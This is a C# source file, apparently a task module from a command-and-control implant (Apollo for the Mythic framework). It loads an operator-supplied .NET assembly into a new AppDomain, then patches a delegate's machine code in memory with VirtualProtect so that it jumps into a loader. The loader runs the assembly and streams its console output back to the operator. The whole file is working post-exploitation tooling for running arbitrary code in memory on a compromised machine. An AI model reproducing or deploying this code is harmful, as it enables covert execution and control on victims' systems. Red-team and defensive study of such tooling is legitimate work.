#define COMMAND_NAME_UPPER

#if DEBUG
#define INLINE_ASSEMBLY
#endif

#if INLINE_ASSEMBLY

using System;
using System.Linq;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System.Runtime.Serialization;
using System.Threading;
using System.IO;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Runtime.CompilerServices;
using ApolloInterop.Classes.Api;
using ApolloInterop.Classes.IO;
using Task = ApolloInterop.Structs.MythicStructs.Task;

namespace Tasks
{
    public class inline_assembly : Tasking
    {
        [DataContract]
        internal struct InlineAssemblyParameters
        {
            [DataMember(Name = "assembly_name")]
            public string AssemblyName;
            [DataMember(Name = "assembly_arguments")]
            public string AssemblyArguments;
        }
        
        private delegate bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        private readonly VirtualProtect _pVirtualProtect;

        private delegate IntPtr CommandLineToArgvW(
            [MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine,
            out int pNumArgs);

        private readonly CommandLineToArgvW _pCommandLineToArgvW;
        
        private delegate IntPtr LocalFree(IntPtr hMem);

        private readonly LocalFree _pLocalFree;

        private static readonly AutoResetEvent Complete = new AutoResetEvent(false);
        
        private readonly Action<object> _sendAction;

        private System.Threading.Tasks.Task _sendTask = null;

        private static string _output = "";

        private static bool _completed = false;
        
        
        public inline_assembly(IAgent agent, Task task) : base(agent, task)
        {
            _pVirtualProtect = agent.GetApi().GetLibraryFunction<VirtualProtect>(Library.KERNEL32, "VirtualProtect");
            _pCommandLineToArgvW =
                agent.GetApi().GetLibraryFunction<CommandLineToArgvW>(Library.SHELL32, "CommandLineToArgvW");
            _pLocalFree = agent.GetApi().GetLibraryFunction<LocalFree>(Library.KERNEL32, "LocalFree");
            _sendAction = o =>
            {
                string accumOut = "";
                string slicedOut = "";
                int lastOutLen = 0;
                while (!_completed && !_cancellationToken.IsCancellationRequested)
                {
                    WaitHandle.WaitAny(new WaitHandle[]
                    {
                        Complete
                    }, 1000);
                    accumOut = _output;
                    slicedOut = accumOut.Skip(lastOutLen).Aggregate("", (current, s) => current + s);
                    lastOutLen = accumOut.Length;
                    if (!string.IsNullOrEmpty(slicedOut))
                    {
                        _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                            slicedOut,
                            false,
                            ""));
                    }
                }
                
                slicedOut = _output.Skip(lastOutLen).Aggregate("", (current, s)=> current + s);
                if (!string.IsNullOrEmpty(slicedOut))
                {
                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                        slicedOut,
                        false,
                        ""));
                }
            };
        }
        
        private string[] ParseCommandLine(string cmdline)
        {
            int numberOfArgs;
            IntPtr ptrToSplitArgs;
            string[] splitArgs;

            ptrToSplitArgs = _pCommandLineToArgvW(cmdline, out numberOfArgs);

            // CommandLineToArgvW returns NULL upon failure.
            if (ptrToSplitArgs == IntPtr.Zero)
                throw new ArgumentException("Unable to split argument.", new Win32Exception());

            // Make sure the memory ptrToSplitArgs to is freed, even upon failure.
            try
            {
                splitArgs = new string[numberOfArgs];

                // ptrToSplitArgs is an array of pointers to null terminated Unicode strings.
                // Copy each of these strings into our split argument array.
                for (int i = 0; i < numberOfArgs; i++)
                    splitArgs[i] = Marshal.PtrToStringUni(
                        Marshal.ReadIntPtr(ptrToSplitArgs, i * IntPtr.Size));

                return splitArgs;
            }
            finally
            {
                // Free memory obtained by CommandLineToArgW.
                _pLocalFree(ptrToSplitArgs);
            }
        }

        private bool LoadAppDomainModule(String[] sParams, Byte[] bMod)
        {
            AppDomain isolationDomain = AppDomain.CreateDomain(Guid.NewGuid().ToString());
            isolationDomain.SetData("str", sParams);
            bool defaultDomain = AppDomain.CurrentDomain.IsDefaultAppDomain();
            try
            {
                isolationDomain.Load(bMod);
            }
            catch
            {
                
            }
            var sleeve = new CrossAppDomainDelegate(Console.Beep);
            var ace = new CrossAppDomainDelegate(ActivateLoader);

            RuntimeHelpers.PrepareDelegate(sleeve);
            RuntimeHelpers.PrepareDelegate(ace);


            var flags = BindingFlags.Instance | BindingFlags.NonPublic;
            var codeSleeve = (IntPtr)sleeve.GetType().GetField("_methodPtrAux", flags).GetValue(sleeve);
            var codeAce = (IntPtr)ace.GetType().GetField("_methodPtrAux", flags).GetValue(ace);

            int[] patch = new int[3];

            patch[0] = 10;
            patch[1] = 11;
            patch[2] = 12;

            uint oldprotect = 0;
            if (!_pVirtualProtect(codeSleeve, new UIntPtr((uint) patch[2]), 0x4, out oldprotect))
            {
                return false;
            }
            Marshal.WriteByte(codeSleeve, 0x48);
            Marshal.WriteByte(IntPtr.Add(codeSleeve, 1), 0xb8);
            Marshal.WriteIntPtr(IntPtr.Add(codeSleeve, 2), codeAce);
            Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[0]), 0xff);
            Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[1]), 0xe0);
            if (!_pVirtualProtect(codeSleeve, new UIntPtr((uint) patch[2]), oldprotect, out oldprotect))
            {
                return false;
            }

            if (codeSleeve == IntPtr.Zero || codeAce == IntPtr.Zero)
            {
                return false;
            }
            try
            {
                isolationDomain.DoCallBack(sleeve);
            }
            catch (Exception ex)
            {
                return false;
            }
            UnloadAppDomain(isolationDomain);
            return true;
        }

        static void ActivateLoader()
        {
            string[] str = AppDomain.CurrentDomain.GetData("str") as string[];
            EventableStringWriter stdoutWriter = new EventableStringWriter();
            stdoutWriter.BufferWritten += (sender, args) =>
            {
                if (!string.IsNullOrEmpty(args.Data))
                {
                    _output += args.Data;
                }
            };
            Console.SetOut(stdoutWriter);
            Console.SetError(stdoutWriter);
            foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
            {
                if (!asm.FullName.Contains("mscor"))
                {
                    var costuraLoader = asm.GetType("Costura.AssemblyLoader", false);
                    if (costuraLoader != null)
                    {
                        var costuraLoaderMethod = costuraLoader.GetMethod("Attach", BindingFlags.Public | BindingFlags.Static);
                        if (costuraLoaderMethod != null)
                        {
                            costuraLoaderMethod.Invoke(null, new object[] { });   
                        }
                    }
                    asm.EntryPoint.Invoke(null, new object[] { str });
                    Console.Out.Flush();
                    Console.Error.Flush();
                }
            }
        }

        private static void UnloadAppDomain(AppDomain oDomain)
        {
            AppDomain.Unload(oDomain);
        }

        public override void Kill()
        {
            _completed = true;
            _cancellationToken.Cancel();
            Complete.Set();
        }

        public override System.Threading.Tasks.Task CreateTasking()
        {
            return new System.Threading.Tasks.Task(() =>
            {
                TaskResponse resp;
                TextWriter realStdOut = Console.Out;
                TextWriter realStdErr = Console.Error;
                try
                {
                    _agent.AcquireOutputLock();
                    
                    InlineAssemblyParameters parameters = _jsonSerializer.Deserialize<InlineAssemblyParameters>(_data.Parameters);
                    
                    if (_agent.GetFileManager().GetFileFromStore(parameters.AssemblyName, out byte[] assemblyBytes))
                    {
                        byte[] ByteData = assemblyBytes;
                        string[] stringData = string.IsNullOrEmpty(parameters.AssemblyArguments) ? new string[0] : ParseCommandLine(parameters.AssemblyArguments);
                        _sendTask =
                            System.Threading.Tasks.Task.Factory.StartNew(_sendAction, _cancellationToken.Token);
                        if (LoadAppDomainModule(stringData, ByteData))
                        {
                            resp = CreateTaskResponse("", true);
                        }
                        else
                        {
                            resp = CreateTaskResponse("Failed to load module.", true, "error");
                        }
                    }
                    else
                    {
                        resp = CreateTaskResponse($"{parameters.AssemblyName} is not loaded (have you registered it?)", true);
                    }
                }
                catch (Exception ex)
                {
                    resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
                }
                finally
                {
                    Console.Out.Flush();
                    Console.Error.Flush();
                    Console.SetOut(realStdOut);
                    Console.SetError(realStdErr);
                    _completed = true;
                    Complete.Set();
                    if (_sendTask != null)
                    {
                        _sendTask.Wait();   
                    }

                    _completed = false;
                    _output = "";
                    _agent.ReleaseOutputLock();
                }
                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
            }, _cancellationToken.Token);
        }
    }
}
#endif